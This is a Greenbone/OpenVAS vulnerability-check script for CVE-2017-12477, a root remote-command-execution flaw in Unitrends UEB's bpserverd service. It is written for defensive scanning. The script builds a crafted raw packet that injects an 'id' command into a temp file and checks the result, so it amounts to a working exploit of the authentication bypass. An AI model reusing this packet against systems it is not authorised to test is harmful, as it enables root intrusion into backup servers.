# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140446");
  script_version("2024-06-28T15:38:46+0000");
  script_tag(name:"last_modification", value:"2024-06-28 15:38:46 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2017-10-23 13:21:51 +0700 (Mon, 23 Oct 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-12-16 18:48:00 +0000 (Thu, 16 Dec 2021)");

  script_cve_id("CVE-2017-12477");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Unitrends < 10.0.0 RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("General");
  script_dependencies("gb_unitrends_http_detect.nasl");
  script_mandatory_keys("unitrends/detected");
  script_require_ports(1743);

  script_tag(name:"summary", value:"Unitrends UEB is prone to a remote code execution (RCE)
  vulnerability in bpserverd.");

  script_tag(name:"insight", value:"It was discovered that the Unitrends bpserverd proprietary
  protocol, as exposed via xinetd, has an issue in which its authentication can be bypassed. A
  remote attacker could use this issue to execute arbitrary commands with root privilege on the
  target system.");

  script_tag(name:"vuldetect", value:"Sends a crafted request to bpserverd and checks the response.");

  script_tag(name:"affected", value:"Unitrends UEB prior to version 10.0.0.");

  script_tag(name:"solution", value:"Update to version 10.0.0 or later.");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/144693/Unitrends-UEB-bpserverd-Authentication-Bypass-Remote-Command-Execution.html");
  script_xref(name:"URL", value:"https://support.unitrends.com/UnitrendsBackup/s/article/000005755");

  exit(0);
}

include("misc_func.inc");

port = 1743;
if (!get_port_state(port))
  exit(0);

soc1 = open_sock_tcp(port);
if (!soc1)
  exit(0);

recv = recv(socket: soc1, length: 512);

if ("Connect" >!< recv || strlen(recv) < 41) {
  close(soc1);
  exit(0);
}

backport = substr(recv, 36, 40);
if (!backport || backport < 1 || backport > 65535) {
  close(soc1);
  exit(0);
}

# Open the back port for the result
soc2 = open_sock_tcp(backport);
if (!soc2) {
  close(soc1);
  exit(0);
}

# It seems we have to pipe the results to a file to get the result back
vt_strings = get_vt_strings();
cmd = 'id > /tmp/' + vt_strings["lowercase"] + '#';
cmd_len = strlen(cmd) + 3;
pkt_len = strlen(cmd) + 23;

data = raw_string(0xa5, 0x52, 0x00, 0x2d, 0x00, 0x00, 0x00, pkt_len, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
                  0x4c, 0x00, 0x00, 0x00, cmd_len, cmd, 0x00, 0x00, 0x00);

# Send to first port and get the response over the back port
send(socket: soc1, data: data);
recv = recv(socket: soc2, length: 1024);

close(soc1);
close(soc2);

if (recv =~ 'uid=[0-9]+.*gid=[0-9]+') {
  report = "It was possible to execute the 'id' command.\n\nResult:\n" + recv;
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
